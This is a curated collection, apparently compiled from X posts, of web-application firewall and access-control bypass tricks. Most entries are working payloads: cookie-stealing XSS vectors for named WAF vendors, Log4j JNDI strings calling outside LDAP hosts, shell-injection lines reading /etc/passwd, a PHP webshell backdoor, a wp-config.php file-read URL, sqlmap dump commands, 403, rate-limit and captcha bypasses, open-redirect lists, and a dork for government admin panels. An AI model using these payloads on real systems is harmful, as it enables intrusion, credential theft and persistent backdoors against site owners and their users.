# X 语料 · WAF 绕过（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。
同一载荷被多号转贴者只留一份；仅带图无正文的帖子已剔除。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[WAF 与逐层解析](../by-type/waf-bypass.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-waf（98 条）、x-residual-waf_bypass（3 条） · 本文 314 行

- Akamai WAF bypass:
  1. Try to use URL encoded chars
  2. You can use <object> tag
- Tomcat 8 on Windows bypass:
  https://x.x.x.x/WEB-INF/web.xml -> 403 Forbidden
  https://x.x.x.x/./WEB-INF/web.xml -> 403 Forbidden
  https://x.x.x.x/.//WEB-INF/web.xml -> 200 OK
- Bypass 401 Unauthorized in IDOR testing with HPP:
  ?userid={victim id}&userid={attacker id}
- WAF bypasses by vendor:
  - Imperva:      <a69/onclick=write&lpar;&rpar;>pew
  - DotDefender:  <a69/onclick=[0].map(alert)>pew
  - Cloudbric:    <a69/onclick=[1].findIndex(alert)>pew
- WAF bypass case:
  > WAF blocked the tag
  > 'src' attr got blocked too
  > WAF didn't block <image>
  Payload:
  <image  onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
- Some useful characters for bypassing WAF (URL-Encoded):
  %0a%0d
  %09
  %00
  %e2%80%ae
- Looking for logins to test bypass:
  site:*.gob.* inurl:"adminpanel.php" | "/admin/admin.php" -github -developer -stackoverflow -wordpress -gitlab
  Change the domain and add more admin extensions for different results.
- Leverage an open redirect using the chinese dot trick (%E3%80%82) to bypass the dot (.) which was filtered:
  ?url=////example%E3%80%82com
- WP Username enumeration, and the bypasses for each path:
  /wp-json/wp/v2/users/          -> bypass: /wp-json/wp/v2/users/n
  /wp-json/?rest_route=/wp/v2/users/
  /wp-json/?rest_route=/wp/v2/users/n
  /?author=n
  (n=1,2,3..)
- Before intercepting even a single request in burp, enable the Binary and Images filter in the proxy history. Hitting directory traversals with ../../../../../etc/passwd works well.
- "new URL()" in safari validated "javascript://" with a valid hostname — a good bypass source.
- A hell filter bypass payload:
  &lt;--`<a href=javas&#99;ript:alert(document.domain)>'"\>
- Simple oneliner to filter out domains with 200 status and further digging:
  cat domains.txt | httpx -follow-redirects -status-code -vhost -threads 100 | sort -u | grep "200" | cut -d [ -f1 | tee output.txt
- Bypass via onpointerrawupdate — this evaluates to alert(1):
  onpointerrawupdate= " A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I](C[A]+C[G]+B[H]+F+E+'(A)')() "
  https://aem1k.com/aurebesh.js/
- Simple vulnerabilities that can be detected in 10 seconds:
  1-) /wp-json/wp/v2/users/ ~ {Username Disclosure}
  2-) p=none; ~ DMARC Misconfiguration
  3-) xmlrpc.php ~ DoS, Waf Bypass and XSPA
- Bypass CloudFlare WAF:
  Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
- Using ffuf and want to filter out the md output and reduce false positives:
  cat ffuf.md | grep 'http' | awk -F ' ' '{print $6,$13}' | sort -u -k 1,2 | tee ffuf-results.txt
- chaos -silent -d http://paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -silent -title | tr "[]" " "
  https://github.com/KingOfBugbounty/KingOfBugbountyTips
- Hunt over VDP:
  1. Collect all 403 endpoints
  2. Fuzz them with 403 bypass payload at the end
  3. Filter out status code 403
  4. Now you have all 403 bypassed endpoints
- Few ways to bypass 403 and access admin portal:
  /admin%20, /admin;/ and /admin/..;/
- Some commands aimed to bypass WAFs:
  cat /e${the}tc/${game}pas${ftw}swd
  cat /etc/pas${the[$game]}swd
  cat /etc/pas${the[${game}]}swd
  cat /etc/pas${the[${game[${ftw}]}]}swd
  cat /e$()tc/passwd
  cat /et$*c/pas$@swd
  cat$the /etc$game/passwd$ftw
- How to use Linkfinder/SecretFinder with a list of URLs:
  cat JSLinks | xargs -I %% bash -c 'python linkfinder.py -i %% -o cli'
  Extract all JS files from Burp: Target > filter show only JS > right click > Copy Selected URL
- Character \uffff is useful for evading WAFs.
- Cloudflare bypass:
  <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
- WordPress recon chain: wappalyzer → version → all plugins (wpscan --url http://site.com) → CVE for that version. jsmol plugin vulnerable to SSF:
  https://site.com/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
- How to bypass 403 Forbidden — method switch:
  Exploited command: curl -H "Content-Length:0" -X POST <PUT URL>
  Denied command: curl -X GET <PUT URL>
- Rate Limiting Bypass
  1. IP rotation — sending new IPs
  2. Null byte -- %00, %0d%0a, %09
  example: email:test5119@yopmail.com%00
  3. X-Forwarded-For: 127.0.0.1
  4. Double X forward option:
  X-Forwarded-For:
  X-Forwarded-For: 127.0.0.1
  5. Append a trailing slash to the path: /api/v2/sign-up -> /api/v2/sign-up/
  6. Use a similar endpoint: /api/v3/sign-up -> /Sing-up, /SignUp, /singup
- 403 forbidden bypass:
  POST /xmlrpc HTTP/1.1  Host: http://target.com  -> 403 Forbidden
  POST / HTTP/1.1  Host: http://target.com  X-rewrite-url: xmlrpc.php  -> 200 ok
- Bypass eventhandler: onxxx ==> block (length >=5), onxx ==> allow (length <5).
  <form action=javascript:alert(0)><input type=submit> is allowed.
- Simple bashrc addon:
  bypass (){ /dir/byp4xx.sh -c $1 }
  https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh
- Filter allowing only <marquee>: place the encoded payload between marquee tags after an HTML tag to bypass:
  "%3Cmarquee%3E%3C%2Fbr%3E%3C%2Fbr%3E%27%22%3E%22%3E%3Ciframe%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E"
- Bypass Cloudflare payload:
  "Onx=() AutOfOcUs OnfOCuS=prompt(document.cookie)>
- Apache Sling JSON GET Servlet bypass technique:
  hxxps://targetAEM/node/........json <--- blocked?
  Try: hxxps://targetAEM/nod/.......json
- Bypass Access Denied:
  target/api/v1/users/redacted => 403
  target/api/v1/users/redacted.json => 200
- Authentication Bypass:
  /api/6798556007/users -> 403 (Forbidden)
  Bypass Method 1: /api//users -> 200 OK
  Bypass Method 2: /api\users -> 200 OK
- Imperva bypass (2020):
  <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap
- Filter bypass by obfuscation:
  globalThis[/al/.source+/ert/.source]`1`
  (1,2,3,4,5,6,7,8,alert)(1)
  [alert][0].call(this,1)
  top['al\x65rt'](1)
  window['a'+'l'+'e'+'r'+'t'].call(this,1)
  top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
  https://github.com/Y000o/Payloads_xss_sql_bypass
- Telerik / AkamaiGhost WAF quick tip:
  domain/Telerik.Web.UI.WebResource.axd?type=rau -> Blocked
  domain/Telerik.Web.UI.WebResource.axd?type=r%61u -> HTTP 200
- Last WAF bypass for log4j injection:
  ${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://mydogsbutt.com:1389/o}
- 403 bypass:
  Accessed http://sensitive.target.com -> 403 Forbidden
  Referer: https://sensitive.target.com -> 200 OK
- Email verification bypass via response manipulation:
  1. create your account
  2. open burp suite, intercept on request to response
  3. enter any code and click verify
  4. change
  403 un. ---> 200 OK
  err ---> success
  invalid code ---> valid code
- Cloudflare bypass:
  "-alert(0)-" : blocked
  "-top['al\x65rt']('sailay')-" : works
- Bypass 403 errors on GitHub Repos: if a "/.git" directory returns 403 Forbidden, try a common subdirectory like "/.git/config".
- Bypass 403 API end-point:
  /api/v1/user/id.json
  /api/v1/user/id?
  /api/v1/user/id/
  /api/v2/user/id
  /api/v1/user/id&accountdetail
  /api/v1/user/yourid&victimid
  X-Original-URL: /api/v1/user/id/
- 403 bypass: change the wordlist entry case — api/bEtA; also path traversal: /app/beta/?file=....//flag.txt
- Bypass final payload Cloudflare:
  <h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
- Bypass Open Redirect:
  target[.]com/?redirect_to=evil[.]com ===> Warning Site
  Bypass with a capital character: target[.]com/?redirect_to=evil[.]cOm ===> redirect to evil[.]com
- If your input <>" is filtered out and is reflected in a context like:
  <div id="example" onclick="runjs('userinput&lt;&quot;');">
  You can still break out with: ');alert('test');
  <div id="example" onclick="runjs('userinput');alert('test');">
- Open redirect filter bypass payload list:
  //evil.com
  \/evil.com
  \/\/evil.com
  \\http://evil.com
  //theirsite@evil.com
  ////evil.com
  //google%E3%80%82com
  //%2F/evil.com
  /%2F/yoururl.com
- WordPress Endpoint Bypass — just replace "wp-json" with the "?rest_route=" parameter.
- 403 bypass: protected paths bypassed with a path parameter
  "https://target.com/example" ---> 403
  "https://target.com/;param=value/example" ---> 200
- If you encounter a filter that checks for any protocol with 2 forward slashes (= comment in JS) *://*, you can still inject code on a new line via %E2%80%A8 and execute javascript.
- JS Analysis:
  http://target.com -> 404
  http://target.com/console -> 403
  View-Source shows: if (data == 'SUCCESS') { location.href = "/console/?r="+role; }
  PoC: http://target.com/console/?r=admin -> 403 Bypass
- 403 Bypass:
  site[.]com/env => 403 Forbidden
  site[.]com/env/HTTPS2 => Bypassed
- Origin IP found to bypass WAF:
  1. Check the domain historical data on securitytrails
  2. Check the domain cert on censys
- New method to bypass 403 forbidden: remove all the headers from the request except GET path, and change to HTTP/1.0.
  https://medium.com/@abbasheybati1/403-bypass-lyncdiscover-microsoft-com-db2778458c33
- Filter bypass with regex for OS injection where /"'&|()-;:.,` are commonly blocked by WAF — reading /etc/passwd:
  cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
- Use &#01; before the javascript protocol to bypass protection in an <a> tag:
  <a href="&#01;javascript:alert(1)">
- Filter ffuf output:
  cat * | jq | grep "url\"" | grep -v "replayproxyurl" | grep -v "proxyurl" | grep -v "FUZZ" | cut -d \" -f4
- WAF deletes your backdoor — bypass:
  <?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);
- OData query injection is an under-read attack surface. For a URL like $"accounts?filter=id eq '${untrustedInput}'" called from a backend, injecting a ' or a & character breaks out of the query.
- 403 Forbidden bypass: try appending %2e or %2f or /./ after the first slash
  https://www.domain/DB = 403
  https://www.domain/%2e/DB = 200
  https://www.domain/./DB = 200
- JavaScript discovery:
  1. Burp: Spider and discover content; Sitemap > filter; Sitemap > right-click domain > Engagement tools > Find scripts
  2. waybackurls <domain> | grep -i "\.js" | sort -u
- Adobe AEM Dispatcher filter bypass — hunting for JSON GET Servlet on /content.1.json returns 404? Try:
  /conten/.1.json
  /conten/t.1.json
  /content.tidy.1.json
  /conten/.tidy.infinity.json
- 403 Forbidden bypass by adding a single forward slash in the path:
  /admin/register --> Forbidden
  /admin/register/ --> 200 OK
- One-liner to extract all parameters from a list of urls:
  cat waybackurls.txt | sort -u | unfurl --unique keys > paramlist.txt
- Various servers behind Akamai: the original payload gives Forbidden, use this bypass:
  post_logout_redirect_uri=%0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E
- Open redirect bypass where the target only allowed *.target.com: entering hxxp://evil.com%EF%BC%http://A1.target.com made the backend return hxxp://evil.com/?.target.com
- Regex to filter out potential juicy subdomains:
  subfinder -d http://target.com -silent | dnsx -silent | cut -d ' ' -f1 | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
- Some ways to bypass 403
  1- using space symbols
  /admin -> 403
  /admin%09 -> 200
  /admin%20 -> 200
  2- use traversal
  /admin -> 403
  /..;/admin -> 200
  You can fuzz with traversal: /..;/FUZZ
- Use dnsx to bruteforce subdomains and filter the successful requests with httpx:
  dnsx -d roots.txt -w <key,words> | httpx -sc -mc 200
- Authentication bypass and reading internal files — fuzz for special and unicode characters:
  /admin/files --> 302 /authFailure
  /adminFUZZ/files --> 200
  /admin/FUZZ/files --> 200
- 403 Forbidden bypass:
  GET /admin = 403 Forbidden
  GET /random-dir/../admin = 200 OK
  Cloudflare IP Restriction bypass:
  GET /admin = Error 1006 (Cloudflare)
  GET /admin? = 200 OK
- Open redirect filter bypassed by converting the IP address into decimal notation:
  http%3a%2f%2f2398795022%5c
- A bypass working for a few WAFs (Log4j):
  ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
- Bypass URL-encoding sanitization by encoding, or even double URL encoding, the ../ characters: %2e%2e%2f and %252e%252e%252f respectively. Double-encode the payload to reach etc/passwd.
- FFUF fuzzing one endpoint across a large amount of alive hosts:
  cat alive.txt | grep -v "filter" | ffuf -u https://FUZZ/endpoint -w - -fw 1
- Don't filter directory brute-force results by status code. Paths can exist and return a 404:
  /noexist/ 404 Not Found
  /api/ 404 Not Found (different response body)
  /api/endpoint 200 OK
  Filter by Content-Length, number of words/lines in the response body.
- Captcha Bypass Techniques:
  1. Remove Captcha parameters
  2. Send empty/modified values
  3. Change POST to GET, remove Captcha
  4. Change type, remove Captcha
  5. Repeat request with same Captcha key
  6. Use headers like X-Forwarded-For
- Admin panel bypass with admin=1:
  /admin/tools/* --> 404 not found
  but in the response there was a new cookie (with empty value) --> Set-Cookie:admin=;
  Bypass request:
  GET /admin HTTP/1.1
  Cookie:admin=1;
- If you have a list of IPv4 and IPv6 IPs, filter the IPv4 out with:
  cat ips.txt | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
- Find more IDORs — don't just change the user id:
  /account/1234 --> 403
  Bypass by appending %20, %09, %0b, %0c, %1c, %1d, %1e, /
- WAF bypass:
  <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
- If you hit a syntax error but are stuck with server delay and WAF block, use --delay (with Tor or VPN):
  sqlmap -u 'https://domain[.]X/blablabla.php?kID=1%27' -p parameter --dbs --delay=3
- Captcha Bypass: captured the sign up request and found 2 parameters "token" and "captcha-response" having the same value. The server only validates that both parameters are the same in order to validate captcha — set both to the same value and bypass.
- Bypass 403 with a static extension:
  https://dev.target.com/management/info -> 403
  https://dev.target.com/management/info.css -> 200
  Try js, json, png extensions too.
- Bypass WAF for sqlmap:
  sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
- Open redirect bypass:
  https://target[.]com///exam[.]com/ --> 404 Not found
  https://target[.]com///exam[.]com/? --> Redirects to exam[.]com
  Another bypass:
  https://target[.]com/exam[.]com --404
  https://target[.]com/exam[.]com/ --success
- Identify WAF bypass with unicode slash:
  curl https://target.com/%c0%afadmin
  Unicode tricks like %c0%af bypass naive WAFs or outdated path filters — try /..%2fadmin too.
- 403 bypass payloads:
  - X-Forwarded-For: 127.0.0.1
  - /dir/..;/dir/
  - Host: localhost
  - /admin -> /Admin
  - /file/../file
- CloudFront WAF sets a 403 interception rule for the `/actuator` path, but URL-encoding each character bypasses it and reaches Spring Boot directly:
  /%61%63%74%75%61%74%6f%72
- Bypass by URL-encoding one character of the path:
  https://test.com/metrics --> 403
  https://test.com/metric%73 --> 200
- Redirect filter only checks "starts with / but not //"?
  ?redirect_url=/%0a/attacker.com
  Browsers strip LF/CR/TAB before parsing (WHATWG), so /\n/attacker.com -> //attacker.com -> offsite.
  Validator sees a path. Browser sees a host.
  %09 and %0d work too.
